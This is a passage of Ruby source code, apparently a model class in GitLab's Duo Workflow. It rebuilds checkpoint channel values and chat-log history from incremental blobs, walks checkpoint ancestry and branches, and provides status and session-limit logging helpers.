      def associated_pipelines
        workloads.includes(:pipeline).filter_map(&:pipeline).uniq
      end

      def mcp_enabled?
        return true if resource_parent.root_ancestor.duo_workflow_mcp_enabled

        false
      end

      # The newest header stands for the whole workflow: no channel_keys means the writer
      # predates the column, so the fold cannot tell a deleted channel from a live one
      # (https://gitlab.com/gitlab-org/gitlab/-/issues/613975) and the dual-written legacy
      # rows are the truth. A time-travel read of an older pre-column header still folds.
      def legacy_checkpoint_fallback?
        header = latest_checkpoint_header

        header.present? && header.channel_keys.nil?
      end
      strong_memoize_attr :legacy_checkpoint_fallback?

      # Which checkpoint source each read consumer serves. Memoized so the consumers
      # sharing this workflow object share one gate, and with it one header query.
      def incremental_blob_gate
        ::Gitlab::DuoWorkflow::IncrementalBlobGate.new(self)
      end
      strong_memoize_attr :incremental_blob_gate

      # Latest record to read ui_chat_log from: the slim CheckpointHeader when gated,
      # else the full Checkpoint. Both carry thread_ts for use as a cursor identity.
      def latest_readable_checkpoint
        if incremental_blob_gate.read?
          latest_checkpoint_header
        else
          # rubocop:disable Gitlab/Ai/AvoidDirectCheckpointTableRead -- legacy branch of the blob read gate
          checkpoints.latest
          # rubocop:enable Gitlab/Ai/AvoidDirectCheckpointTableRead
        end
      end

      # ui_chat_log for a #latest_readable_checkpoint record: folded from blobs when
      # gated, else read from the checkpoint channel_values. The blob fold is the
      # current group's state unless `span_compactions` asks for the whole history.
      # A metadata-retention session's log is reduced to its content-free shape.
      def ui_chat_log_for(record, span_compactions: false)
        return [] unless record

        log =
          if !incremental_blob_gate.read?
            record.ui_chat_log
          elsif span_compactions
            channel_message_history(record, 'ui_chat_log')
          else
            reconstructed_channel(record, 'ui_chat_log')
          end

        return [] unless log.is_a?(Array)

        metadata_content_retention? ? ::Ai::DuoWorkflows::ContentRetention.ui_chat_log(log) : log
      end

      # Latest header for `thread_ts`. Headers are append-only (a
      # re-sent checkpoint writes another row), so the highest id is the newest.
      def checkpoint_header_for(thread_ts)
        checkpoint_headers
          .where(thread_ts: thread_ts)
          .order(:id)
          .last
      end

      # Newest header across the workflow (or one lineage), ordered by DWS
      # thread_ts (a time-ordered UUID; see CheckpointHeader.in_checkpoint_order).
      # Mirrors `Checkpoint.latest`'s `checkpoint_ns:` argument, which defaults to
      # nil (the flow's own top-level lineage) so a nested subagent's header
      # can't outrank it.
      #
      # It omits Checkpoint.latest's created_at + CLOCK_SKEW_BUFFER bound. That
      # bound keeps Checkpoint's created_at partition pruning safe under Rails clock
      # skew. This path prunes by workflow_created_at instead, so it needs neither
      # the bound nor the margin. Omitting it changes behavior: we keep a header even
      # when its Rails insert clock ran fast. We order by thread_ts, not created_at,
      # so that is correct.
      # Memoized per lineage: the read gate and the consumer that serves the header both
      # read this row, so one request would otherwise run the same query twice.
      def latest_checkpoint_header(checkpoint_ns: nil)
        strong_memoize_with(:latest_checkpoint_header, checkpoint_ns) do
          checkpoint_headers.for_checkpoint_ns(checkpoint_ns).in_checkpoint_order.last
        end
      end

      # A batch-fetched header lacks the association's inverse link; restore it
      # so header.workflow leads back to this instance and its cached data.
      def prime_latest_checkpoint_header(header, checkpoint_ns: nil)
        header.association(:workflow).target = self if header

        strong_memoize_with(:latest_checkpoint_header, checkpoint_ns) { header }
      end

      # Whether this lineage's header is already loaded, so a second primer
      # skips the workflow instead of refetching.
      def latest_checkpoint_header_loaded?(checkpoint_ns: nil)
        strong_memoize(:latest_checkpoint_header) { {} }.key?([checkpoint_ns])
      end

      # Oldest header across the workflow (or one lineage). Mirrors
      # `Checkpoint.earliest`; see `#latest_checkpoint_header` for why this
      # orders by thread_ts rather than created_at and skips its clock-skew bound.
      def earliest_checkpoint_header(checkpoint_ns: nil)
        strong_memoize_with(:earliest_checkpoint_header, checkpoint_ns) do
          checkpoint_headers.for_checkpoint_ns(checkpoint_ns).in_checkpoint_order.first
        end
      end

      # See #prime_latest_checkpoint_header.
      def prime_earliest_checkpoint_header(header, checkpoint_ns: nil)
        header.association(:workflow).target = self if header

        strong_memoize_with(:earliest_checkpoint_header, checkpoint_ns) { header }
      end

      def earliest_checkpoint_header_loaded?(checkpoint_ns: nil)
        strong_memoize(:earliest_checkpoint_header) { {} }.key?([checkpoint_ns])
      end

      # The newest full row in `p_duo_workflows_checkpoints`, memoized per lineage like
      # #latest_checkpoint_header so the page primer and a direct read share one lookup.
      def latest_legacy_checkpoint(checkpoint_ns: nil)
        strong_memoize_with(:latest_legacy_checkpoint, checkpoint_ns) do
          checkpoints.latest(checkpoint_ns: checkpoint_ns) # rubocop:disable Gitlab/Ai/AvoidDirectCheckpointTableRead -- the row the gate falls back to
        end
      end

      # Sets the inverse, so a primed row's `workflow` is this loaded object.
      def prime_latest_legacy_checkpoint(checkpoint, checkpoint_ns: nil)
        checkpoint.association(:workflow).target = self if checkpoint

        strong_memoize_with(:latest_legacy_checkpoint, checkpoint_ns) { checkpoint }
      end

      def latest_legacy_checkpoint_loaded?(checkpoint_ns: nil)
        strong_memoize(:latest_legacy_checkpoint) { {} }.key?([checkpoint_ns])
      end

      # Oldest full row; mirrors #latest_legacy_checkpoint.
      def earliest_legacy_checkpoint(checkpoint_ns: nil)
        strong_memoize_with(:earliest_legacy_checkpoint, checkpoint_ns) do
          checkpoints.earliest(checkpoint_ns: checkpoint_ns) # rubocop:disable Gitlab/Ai/AvoidDirectCheckpointTableRead -- the row the gate falls back to
        end
      end

      def prime_earliest_legacy_checkpoint(checkpoint, checkpoint_ns: nil)
        checkpoint.association(:workflow).target = self if checkpoint

        strong_memoize_with(:earliest_legacy_checkpoint, checkpoint_ns) { checkpoint }
      end

      def earliest_legacy_checkpoint_loaded?(checkpoint_ns: nil)
        strong_memoize(:earliest_legacy_checkpoint) { {} }.key?([checkpoint_ns])
      end

      # Blobs on `checkpoint`'s full ancestor chain, oldest-first. A fork/rollback
      # (ai-assist#2440) can leave a sibling chain, so restrict to the on-path
      # thread_ts (#full_ancestor_thread_ts) -- a sibling's blobs share
      # (channel, version) and would corrupt the fold.
      #
      # Spans every current_thread group; the channel_values path reads the bounded
      # #group_bounded_blobs instead and falls back here on a missing anchor.
      def accumulated_blobs_for(checkpoint, channels: nil)
        blobs_for_thread_ts(full_ancestor_thread_ts(checkpoint), channels: channels)
      end

      # project_id is the leading column of idx_duo_wf_checkpoint_blobs_dedup, so
      # including it lets that index serve the lookup; the daily-partition bound
      # comes from the checkpoint_blobs association scope. `channels`, when given,
      # restricts the query to those channels so callers that can't return the
      # rest (e.g. the non-owner trace) don't fetch and decompress them.
      def blobs_for_thread_ts(thread_ts_chain, channels: nil)
        scope = checkpoint_blobs.where(project_id: project_id).for_thread_ts(thread_ts_chain)
        scope = scope.where(channel: channels) if channels
        scope.order(:id)
      end

      # Assemble channel_values from incremental blobs, overlaying the reconstructed
      # channels onto whatever base the header carries. With self-contained blob
      # groups the blobs rebuild every reconstructable channel on their own; the
      # merge only preserves non-blobbed scalar channels a slim header may still
      # hold (empty for a header-table read). Falls back to the base when no blobs
      # exist. The membership is pushed into the blob query (see
      # #membership_scoped_channels); #select_live_channels stays the correctness guard.
      def reconstructed_channel_values(checkpoint, channels: nil)
        channels = membership_scoped_channels(checkpoint, channels)
        base = checkpoint.checkpoint&.dig('channel_values') || {}
        base = base.slice(*channels) if channels
        blobs = group_bounded_blobs(checkpoint, channels: channels)
        return select_live_channels(base, checkpoint) if blobs.empty?

        select_live_channels(
          base.merge(::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs).channel_values), checkpoint
        )
      end

      # Blobs are append-only, so the fold returns every channel ever blobbed and a
      # deleted channel survives it. Select the live membership instead
      # (https://gitlab.com/gitlab-org/gitlab/-/issues/613975).
      def select_live_channels(values, checkpoint)
        keys = channel_membership(checkpoint)
        return values if keys.nil?

        values.slice(*keys)
      end

      # The channels `checkpoint` declares live, or nil when it declares none: a
      # header written before channel_keys existed, or a legacy Checkpoint row, which
      # has no such column. Readers fold unfiltered then, as they did before.
      def channel_membership(checkpoint)
        checkpoint.try(:channel_keys)
      end

      # The effective blob-query filter: the header's membership, intersected with
      # an explicit `channels`. Nil (unfiltered) only when both are absent.
      def membership_scoped_channels(checkpoint, channels)
        intersect_channel_filters(channel_membership(checkpoint), channels)
      end

      def intersect_channel_filters(membership, channels)
        return membership unless channels
        return channels unless membership

        channels & membership
      end

      # Every blob on `checkpoints`' bounded ancestor chains (each checkpoint's
      # current_thread group, see #bounded_chain_for) in one query, grouped by
      # thread_ts, so reconstructing a page costs one blob query instead of one per
      # checkpoint. Chains overlap heavily along a lineage, so the union is far
      # smaller than the sum. Pair with #reconstructed_channel_values_from, passing
      # the same `channels`.
      # Restricted to the union of the page headers' memberships, intersected with
      # `channels`; a single membership-less header on the page disables the
      # membership part, since its fold may need any channel.
      def blobs_by_thread_ts_for(checkpoints, channels: nil)
        chain = checkpoints
          .flat_map { |checkpoint| bounded_chain_for(checkpoint, full_ancestor_thread_ts(checkpoint)) }
          .uniq
        return {} if chain.empty?

        scope = checkpoint_blobs.where(project_id: project_id).for_thread_ts(chain)
        channels = intersect_channel_filters(page_channel_membership(checkpoints), channels)
        scope = scope.where(channel: channels) if channels
        scope.order(:id).group_by(&:thread_ts)
      end

      # Nil also above one header's key limit: a page of divergent lineages could
      # union up to 100x that, and the filter is an optimization, not required.
      def page_channel_membership(checkpoints)
        memberships = checkpoints.map { |checkpoint| channel_membership(checkpoint) }
        return if memberships.any?(&:nil?)

        channels = memberships.flatten.uniq
        channels if channels.size <= ::Ai::DuoWorkflows::CheckpointHeader::CHANNEL_KEYS_LIMIT
      end

      # #reconstructed_channel_values against blobs already loaded by
      # #blobs_by_thread_ts_for.
      def reconstructed_channel_values_from(checkpoint, blobs_by_thread_ts, channels: nil, decoded: {})
        base = checkpoint.checkpoint&.dig('channel_values') || {}
        base = base.slice(*channels) if channels
        blobs = group_bounded_blobs_from(checkpoint, blobs_by_thread_ts, channels: channels)
        return select_live_channels(base, checkpoint) if blobs.empty?

        values = ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs, decoded: decoded).channel_values
        select_live_channels(base.merge(values), checkpoint)
      end

      # One channel folded to its latest value, for scalar (replace) channels like
      # status. Unlike #channel_message_history, which keeps every conversation
      # delta, the fold drops everything before the channel's last replace. Decodes
      # only the one channel. Falls back to the header when no blobs exist for it.
      # Returns nil for a channel outside the header's membership (see #select_live_channels).
      def reconstructed_channel(checkpoint, channel)
        return if channel_membership(checkpoint)&.exclude?(channel)

        blobs = accumulated_blobs_for(checkpoint, channels: [channel]).to_a
        return checkpoint.checkpoint&.dig('channel_values', channel) if blobs.empty?

        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs).channel_values[channel]
      end

      # thread_ts of `checkpoint` and every ancestor to the root, newest first.
      # Message history spans compactions; the channel_values fold trims the chain
      # first (#current_group_prefix). Off-path checkpoints are never collected.
      def full_ancestor_thread_ts(checkpoint)
        walk_ancestry(ancestry_map, checkpoint.thread_ts)
      end

      # `chain` trimmed to the target's current_thread group: the counter changes
      # only at group starts, and each group start re-seeds every channel as a full
      # compaction snapshot, so the prefix folds self-contained. Nil group = empty chain.
      def current_group_prefix(chain)
        group = current_thread_by_ts[chain.first]
        return chain if group.nil?

        chain.take_while { |thread_ts| current_thread_by_ts[thread_ts] == group }
      end

      # Without channel_keys the guard has nothing to verify the bound against, so
      # membership-less (pre-column) headers keep the unbounded read.
      def bounded_chain_for(checkpoint, chain)
        return chain unless channel_membership(checkpoint)

        current_group_prefix(chain)
      end

      # Blobs for the channel_values fold: the current group's, verified
      # self-contained. A missing anchor means the bound cut a channel's base, so
      # refetch the full chain -- one retry instead of a wrong fold.
      def group_bounded_blobs(checkpoint, channels: nil)
        chain = full_ancestor_thread_ts(checkpoint)
        bounded = bounded_chain_for(checkpoint, chain)
        blobs = blobs_for_thread_ts(bounded, channels: channels).to_a
        return blobs if bounded.size == chain.size || group_self_contained?(blobs, channels)

        log_unbounded_blob_refetch(checkpoint, bounded)
        blobs_for_thread_ts(chain, channels: channels).to_a
      end

      # #group_bounded_blobs against blobs already loaded by #blobs_by_thread_ts_for.
      # The anchor fallback reads #unbounded_blobs_by_thread_ts, one shared refetch
      # for the whole page. With `channels`, only those channels are returned, so
      # only they need an anchor.
      def group_bounded_blobs_from(checkpoint, blobs_by_thread_ts, channels: nil)
        chain = full_ancestor_thread_ts(checkpoint)
        bounded = bounded_chain_for(checkpoint, chain)
        blobs = chain_blobs_from(bounded, blobs_by_thread_ts)
        blobs = blobs.select { |blob| channels.include?(blob.channel) } if channels
        required = membership_scoped_channels(checkpoint, channels)
        return blobs if bounded.size == chain.size || group_self_contained?(blobs, required)

        log_unbounded_blob_refetch(checkpoint, bounded)
        chain_blobs_from(chain, unbounded_blobs_by_thread_ts(channels))
          .select { |blob| required.include?(blob.channel) }
      end

      # Sorted by blob[:id], not #id: the PK is composite, so #id returns an array
      # and the fold order would follow the PK's column order.
      def chain_blobs_from(thread_ts_chain, blobs_by_thread_ts)
        thread_ts_chain
          .flat_map { |thread_ts| blobs_by_thread_ts[thread_ts] || [] }
          .sort_by { |blob| blob[:id] }
      end

      # Every blob of every known checkpoint (only `channels`, when given), for the
      # anchor-miss fallback: a page in one broken group refetches once, not once per row.
      def unbounded_blobs_by_thread_ts(channels)
        strong_memoize_with(:unbounded_blobs_by_thread_ts, channels) do
          thread_ts = checkpoint_header_rows.map { |_id, ts, _parent_ts, _thread| ts }.uniq
          blobs_for_thread_ts(thread_ts, channels: channels).group_by(&:thread_ts)
        end
      end

      # Every queried channel needs its group-start anchor (channel_keys mirrors
      # channel_values, all re-seeded). A miss: reset numbering, or a pre-2026-08-14
      # group start that skipped scalars. Callers bound only with a membership, so never nil.
      def group_self_contained?(blobs, required_channels)
        compaction = ::Gitlab::DuoWorkflow::ChannelValuesReconstructor::COMPACTION
        anchored = blobs.filter_map { |blob| blob.channel if blob.step_action == compaction }
        (required_channels - anchored).empty?
      end

      # thread_ts -> current_thread, latest id wins (see #parent_ts_map).
      def current_thread_by_ts
        checkpoint_header_rows
          .sort_by(&:first)
          .to_h { |_id, thread_ts, _parent_ts, current_thread| [thread_ts, current_thread] }
      end
      strong_memoize_attr :current_thread_by_ts

      def log_unbounded_blob_refetch(checkpoint, bounded)
        Gitlab::AppJsonLogger.warn(
          build_structured_payload_labkit(
            message: 'Duo Workflow blob group missing a compaction anchor; refetching the full chain',
            Labkit::Fields::DUO_WORKFLOW_ID => id,
            thread_ts: checkpoint.thread_ts,
            bounded_chain_size: bounded.size
          )
        )
      end

      # Memoized: the batch read path walks the chain once per checkpoint on the
      # page, and rebuilding the map each time would be quadratic in the page size.
      def ancestry_map
        parent_ts_map(checkpoint_header_rows)
      end
      strong_memoize_attr :ancestry_map

      # All header rows, plucked once and shared by both ancestor walks so a
      # multi-channel read plucks the headers once. Unordered to keep the selective
      # workflow_id index; #parent_ts_map sorts by id in Ruby. Bounded by the
      # workflow's checkpoint count.
      def checkpoint_header_rows
        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- bounded by the workflow's checkpoint count
        checkpoint_headers.pluck(:id, :thread_ts, :parent_ts, :current_thread)
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end
      strong_memoize_attr :checkpoint_header_rows

      # Seeds the #checkpoint_header_rows memo; see .prime_message_history_context.
      def prime_checkpoint_header_rows(rows)
        strong_memoize(:checkpoint_header_rows) { rows }
      end

      # thread_ts -> parent_ts, latest id wins per thread_ts. A re-sent header keeps
      # the same parent_ts, so the id sort only makes the result deterministic.
      def parent_ts_map(rows)
        rows.sort_by(&:first).to_h { |_id, thread_ts, parent_ts, _current_thread| [thread_ts, parent_ts] }
      end

      # Walk the parent_ts chain from `start_ts` using `parent_of`. DWS parent links
      # should form a tree, but guard the walk: a self-parent or cycle would loop
      # this request forever. Raise (fail-visible) rather than truncate, so a corrupt
      # chain surfaces instead of silently reconstructing partial channel_values.
      def walk_ancestry(parent_of, start_ts)
        path = []
        ts = start_ts
        while ts && parent_of.key?(ts)
          raise CyclicAncestryError, "Cyclic checkpoint ancestry at thread_ts #{ts}" if path.include?(ts)

          path << ts
          ts = parent_of[ts]
        end
        # A hole in the chain (a checkpoint POST that never landed) truncates blob
        # history here. Report it, but keep serving the reachable suffix: existing
        # holes are permanent and raising would make those workflows unreadable.
        # path.any? keeps checkpoints that predate headers silent: checkpoint writes
        # are transactional, so a failed POST leaves no row for a walk to start at.
        report_missing_ancestor(ts) if ts && path.any?
        path
      end

      # Once per missing thread_ts per instance: batch reads walk the chain for
      # every checkpoint on the page and would repeat the report otherwise.
      def report_missing_ancestor(ts)
        @reported_missing_ancestors ||= Set.new
        return unless @reported_missing_ancestors.add?(ts)

        ::Gitlab::ErrorTracking.track_exception(
          MissingAncestryError.new("Checkpoint ancestry truncated at a thread_ts with no header"),
          workflow_id: id, thread_ts: ts
        )
      end

      # Blobs for `channel` on `thread_ts_chain`, oldest-first: a full ancestor chain across
      # compaction groups (#full_ancestor_thread_ts), or branch subtrees (#build_branches).
      # The partition bound comes from the checkpoint_blobs association scope.
      def history_blobs_for(thread_ts_chain, channel, skip_replaced_snapshots: false)
        blobs = checkpoint_blobs.where(project_id: project_id, channel: channel).for_thread_ts(thread_ts_chain)
        blobs = blobs.without_replaced_snapshots if skip_replaced_snapshots
        blobs.order(:id)
      end

      # Full message history for `channel`, folded across every compaction group:
      # all conversation deltas kept, plus what each compaction snapshot adds (see
      # ChannelValuesReconstructor#channel_history). The caller decides when to
      # reconstruct (see WorkflowCheckpointEventPresenter).
      def channel_message_history(checkpoint, channel)
        # Walk the chain here rather than via #full_ancestor_thread_ts so the same
        # header read also stamps each message with its checkpoint's parent_ts.
        ancestry = ancestry_map
        chain = walk_ancestry(ancestry, checkpoint.thread_ts)
        blobs = history_blobs_for(chain, channel, skip_replaced_snapshots: true).to_a
        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor
          .new(blobs)
          .channel_history(channel, ancestry, alternative_counts(ancestry))
      end

      # #channel_message_history against blobs a page loader already fetched,
      # scoped to `channel`. Sorts by blob[:id]; the composite PK makes #id an array.
      # See ChannelValuesReconstructor#channel_history for `from`.
      def channel_message_history_from(checkpoint, channel, blobs_by_thread_ts, from: nil)
        ancestry = ancestry_map
        blobs = walk_ancestry(ancestry, checkpoint.thread_ts)
          .flat_map { |thread_ts| blobs_by_thread_ts[thread_ts] || [] }
          .sort_by { |blob| blob[:id] }

        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor
          .new(blobs)
          .channel_history(channel, ancestry, alternative_counts(ancestry), from: from)
      end

      # Alternatives count per message (messages that share a chat log parent).
      # Absent when a message has no alternatives; callers read those as none.
      def alternative_counts(ancestry)
        alternative_count_map(thread_ts_to_chat_log_parent_ts_map(ancestry))
      end

      # thread_ts -> how many alternatives that message has, counted from a chat log
      # parent map the caller already built: messages sharing a parent are alternatives
      # of each other. Omits messages with none.
      def alternative_count_map(chat_log_parent_of)
        messages_per_parent = chat_log_parent_of.each_value.tally

        chat_log_parent_of.filter_map do |thread_ts, chat_log_parent_ts|
          alternatives_count = messages_per_parent[chat_log_parent_ts] - 1
          [thread_ts, alternatives_count] if alternatives_count > 0
        end.to_h
      end

      # Every other message sharing `thread_ts`'s chat log parent: the branches a client
      # can switch to, each with its own messages and the checkpoint to resume it from.
      def workflow_branches(thread_ts)
        ancestry = parent_ts_map(checkpoint_header_rows)
        wrote_chat_log = chat_log_thread_ts
        chat_log_parent_of = thread_ts_to_chat_log_parent_ts_map(ancestry, wrote_chat_log)
        chat_log_parent_ts = chat_log_parent_of[thread_ts]
        return [] unless chat_log_parent_ts

        unless on_current_branch?(thread_ts, ancestry)
          # If a user passes in the thread_ts of an alternative, the current branch will then be returned.
          # Since the current branch can have more fork points further down, all possible branches will then
          #  be merged.
          raise OffCurrentBranchError, "thread_ts #{thread_ts} is not on the current branch"
        end

        build_branches(
          sibling_messages(chat_log_parent_of, chat_log_parent_ts, thread_ts),
          ancestry: ancestry,
          alternatives: alternative_count_map(chat_log_parent_of),
          wrote_chat_log: wrote_chat_log
        )
      end

      def on_current_branch?(thread_ts, ancestry)
        walk_ancestry(ancestry, ancestry.keys.max).include?(thread_ts)
      end

      # One Branch per sibling: the messages from its subtree, and the checkpoint to resume
      # it from. `ancestry` and `alternatives` stamp each of those messages with its parent
      # and its alternative count.
      def build_branches(sibling_thread_ts, ancestry:, alternatives:, wrote_chat_log:)
        parent_to_children_ts = parent_to_children_ts_map(ancestry)
        subtrees = sibling_thread_ts.index_with do |sibling_ts|
          descendant_thread_ts_from(sibling_ts, parent_to_children_ts)
        end
        branch_thread_ts = subtrees.values.flatten

        statuses = checkpoint_statuses(branch_thread_ts)
        blobs_by_thread_ts = history_blobs_for(branch_thread_ts, 'ui_chat_log', skip_replaced_snapshots: true)
          .group_by(&:thread_ts)

        subtrees.map do |sibling_ts, subtree|
          Branch.new(
            fork_thread_ts: branch_fork_thread_ts(sibling_ts, subtree, parent_to_children_ts, statuses,
              wrote_chat_log),
            messages: branch_messages(subtree.flat_map { |ts| blobs_by_thread_ts.fetch(ts, []) }, ancestry,
              alternatives)
          )
        end
      end

      # thread_ts -> thread_ts of its chat log parent: the checkpoint its alternatives
      # fork from.
      def thread_ts_to_chat_log_parent_ts_map(ancestry, wrote_chat_log = chat_log_thread_ts)
        wrote_chat_log.each_with_object({}) do |thread_ts, chat_log_parent_of|
          parent_ts = chat_log_parent_ts_for(thread_ts, ancestry, wrote_chat_log)

          chat_log_parent_of[thread_ts] = parent_ts if parent_ts
        end
      end

      # The closest ancestor of `thread_ts` that wrote to ui_chat_log.
      # Or the closest ancestor of `thread_ts` regardless of ui_chat_log
      # for retries of the first message who do not have a parent in the ui_chat_log.
      def chat_log_parent_ts_for(thread_ts, ancestry, wrote_chat_log)
        ancestor_ts = ancestry[thread_ts]

        ancestry.size.times do
          return ancestor_ts if ancestor_ts.nil? || wrote_chat_log.include?(ancestor_ts)

          next_ts = ancestry[ancestor_ts]
          return ancestor_ts if next_ts.nil?

          ancestor_ts = next_ts
        end

        raise CyclicAncestryError, "Cyclic checkpoint ancestry at thread_ts #{ancestor_ts}"
      end

      # The other messages sharing `chat_log_parent_ts`, oldest first.
      def sibling_messages(chat_log_parent_of, chat_log_parent_ts, thread_ts)
        chat_log_parent_of.filter_map do |sibling_ts, sibling_parent_ts|
          sibling_ts if sibling_parent_ts == chat_log_parent_ts && sibling_ts != thread_ts
        end.sort
      end

      # parent_ts -> thread_ts of the checkpoints written directly after it, inverted from
      # the same header read as #parent_ts_map. One child is the linear case; several mean
      # a retry forked there. Empty for a leaf.
      def parent_to_children_ts_map(ancestry)
        ancestry.each_with_object(Hash.new { |hash, key| hash[key] = [] }) do |(thread_ts, parent_ts), children|
          children[parent_ts] << thread_ts if parent_ts
        end
      end

      # thread_ts of `root_ts` and everything below it: one branch, isolated from its
      # siblings. Set#add? doubles as the guard against a cyclic child link. Order within
      # the subtree does not matter, so the queue pops from the end.
      def descendant_thread_ts_from(root_ts, parent_to_children_ts)
        subtree = Set.new
        queue = [root_ts]

        until queue.empty?
          thread_ts = queue.pop
          queue.concat(parent_to_children_ts[thread_ts]) if subtree.add?(thread_ts)
        end

        subtree.to_a
      end

      # The checkpoint a client resumes a branch from: its deepest settled point.
      def branch_fork_thread_ts(start_ts, subtree, parent_to_children_ts, statuses, wrote_chat_log)
        thread_ts = start_ts
        status = nil
        settled_ts = nil

        # The descent stays inside the branch, so its size bounds the walk; the bound
        # only stops a cyclic child link from looping forever.
        subtree.size.times do
          status = statuses.fetch(thread_ts, status)
          settled_ts = thread_ts if GRAPH_STATUSES_SETTLED.include?(status) && wrote_chat_log.exclude?(thread_ts)

          next_ts = parent_to_children_ts[thread_ts].max
          break unless next_ts

          thread_ts = next_ts
        end

        settled_ts || thread_ts
      end

      # One branch's messages, folded from its own blobs only, so nothing from the
      # shared prefix or a sibling leaks in.
      def branch_messages(blobs, ancestry, alternatives)
        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor
          .new(blobs)
          .channel_history('ui_chat_log', ancestry, alternatives) || []
      end

      # thread_ts -> graph status, for the checkpoints in `thread_ts_list` that wrote one.
      # Status is a scalar channel, so a blob lands only when the value changes: a
      # checkpoint without one inherits the status of the one before it in the descent.
      #
      # The status decides where a branch forks, and the client resumes from that point,
      # so the rows go through the reconstructor rather than being read raw: one version
      # can hold both a delta and a compaction, and picking between them by row order
      # would move the fork point between requests.
      def checkpoint_statuses(thread_ts_list)
        blobs = history_blobs_for(thread_ts_list, 'status').to_a

        ::Gitlab::DuoWorkflow::ChannelValuesReconstructor
          .new(blobs)
          .scalar_values_by_thread_ts('status')
      end

      # thread_ts of every checkpoint that wrote to ui_chat_log, read from blob metadata:
      # a delta is only written when the log grew or changed, so a row means the
      # checkpoint added messages. Spans every branch, not just the current one, so
      # abandoned attempts still count.
      def chat_log_thread_ts
        chat_log_blob_counts.keys.to_set
      end
      strong_memoize_attr :chat_log_thread_ts

      # thread_ts -> [blobs, versions]: the ui_chat_log blobs that checkpoint wrote, across every
      # branch, and the versions they cover. The history reads one blob per version, since it
      # skips replaced snapshots. Runs index-only on idx_duo_wf_checkpoint_blobs_dedup.
      def chat_log_blob_counts
        checkpoint_blobs.where(project_id: project_id, channel: 'ui_chat_log').group(:thread_ts)
          .pluck(:thread_ts, *CHAT_LOG_COUNTS) # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- one row per checkpoint of the workflow
          .to_h { |thread_ts, *counts| [thread_ts, counts] }
      end
      strong_memoize_attr :chat_log_blob_counts

      # Seeds the #chat_log_blob_counts memo; see .prime_message_history_context.
      def prime_chat_log_blob_counts(counts)
        strong_memoize(:chat_log_blob_counts) { counts }
      end

      # Decodes only the newest blob, compaction snapshots included: a compacting step writes no
      # delta, so skipping them leaves the preview a turn behind. No project_id, so the planner
      # walks (workflow_id, channel, id) back to the newest match instead of sorting the chain.
      def latest_channel_message(checkpoint, channel)
        blob = checkpoint_blobs
          .where(channel: channel)
          .for_thread_ts(full_ancestor_thread_ts(checkpoint))
          .order(:id)
          .last
        blob && ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.decode(blob.data)
      end

      # Complete trace artifact: every recorded change to every channel across the
      # whole session, oldest first. A single-thread read returns only the final
      # snapshot of that thread; this keeps the value changes (plan, status) and
      # the full message history, so the trace shows how the session progressed.
      # `channels`, when given, skips fetching and decoding the rest -- for a
      # non-owner read, whose response drops them anyway.
      def full_trace_channel_values(channels: nil)
        header = latest_checkpoint_header
        return {} unless header

        blobs = accumulated_blobs_for(header, channels: channels).to_a
        reconstructor = ::Gitlab::DuoWorkflow::ChannelValuesReconstructor.new(blobs)
        blobs.map(&:channel).uniq.index_with { |channel| reconstructor.channel_changes(channel) }
      end

      def status_group
        GROUPED_STATUSES.find do |_group, statuses|
          statuses.include?(status_name)
        end&.first
      end

      # Whether the flow has finished (success, failure, or cancellation). Used as
      # the authoritative "terminal owns the surface now" signal so live-progress
      # streaming stops once the flow is done -- no separate flag to keep in sync.
      def status_terminal?
        TERMINAL_STATUSES.include?(status_name)
      end

      def awaiting_approval?
        APPROVAL_STATUSES.include?(status_name)
      end

      def awaiting_user?
        !status_terminal? && status_group != :active
      end

      # Coarse view of the flow for clients that only need to know whether it is
      # running, waiting on the user, or over. Cancellation (`stopped`) reports
      # `:canceled` rather than `:failed`: it is a deliberate user action, not an
      # error, and callers render it differently.
      #
      # @return [Symbol] :generating, :needs_input, :completed, :canceled or :failed
      def progress_status
        return :needs_input if status_group == :awaiting_input
        return :completed if idle?
        return :generating unless status_terminal?
        return :canceled if stopped?
        return :failed unless finished?

        :completed
      end

      def web_url
        Gitlab::UrlBuilder.build(self)
      end

      def add_tool_call_approval(tool_name:, call_args:)
        approvals = ToolCallApprovals.new(tool_call_approvals || {})
        approvals.add_approval(tool_name: tool_name, call_args: call_args)
        self.tool_call_approvals = approvals.to_h
      end

      def add_tool_call_pattern_approval(tool_name:, pattern:)
        approvals = ToolCallApprovals.new(tool_call_approvals || {})
        approvals.add_pattern_approval(tool_name: tool_name, pattern: pattern)
        self.tool_call_approvals = approvals.to_h
      end

      # Public so the state machine's after_transition hook can reach it.
      def counted_flow_type
        base = self.class.flow_type_labels.fetch(workflow_definition.to_s, OTHER_FLOW_TYPE)

        # Verification runs are tagged so they don't skew real usage metrics.
        return "#{base}_verification_run" if triggered_by_verification?

        base
      end

      # Public so the state machine's after_transition hook can reach it. Runs inside
      # run_after_commit, so a failure can never roll back the transition.
      # Observability only: enforcement lives separately (https://gitlab.com/gitlab-org/gitlab/-/work_items/636721).
      def log_concurrent_session_breach(event)
        return unless ACTIVE_DELTA_EVENTS.fetch(event) == :enter_active

        max = self.class::MAX_CONCURRENT_SESSIONS_PER_USER
        active_count = self.class.for_user(user_id).in_status_group(:active).count

        return unless active_count > max

        Gitlab::AppLogger.warn(
          build_structured_payload_labkit(
            message: 'Duo Workflow concurrent session limit exceeded',
            Labkit::Fields::GL_USER_ID => user_id,
            user_type: user.user_type,
            Labkit::Fields::GL_ROOT_NAMESPACE_ID => resource_parent.root_ancestor.id,
            Labkit::Fields::DUO_WORKFLOW_ID => id,
            status_event: event.to_s,
            direction: ACTIVE_DELTA_EVENTS.fetch(event).to_s,
            workflow_environment: environment,
            workflow_source_type: source_type,
            active_session_count: active_count,
            max_concurrent_sessions: max,
            Labkit::Fields::DUO_WORKFLOW_DEFINITION => workflow_definition
          )
        )
      rescue StandardError => e
        Gitlab::ErrorTracking.track_exception(e, workflow_id: id, user_id: user_id)
      end

      def publish_drop_events
        if messaging_outcome_relevant?
          publish_or_discard_on_error do
            ::Ai::DuoWorkflows::WorkflowFailedEvent.build(workflow: self, status_event: :drop)
          end
        end

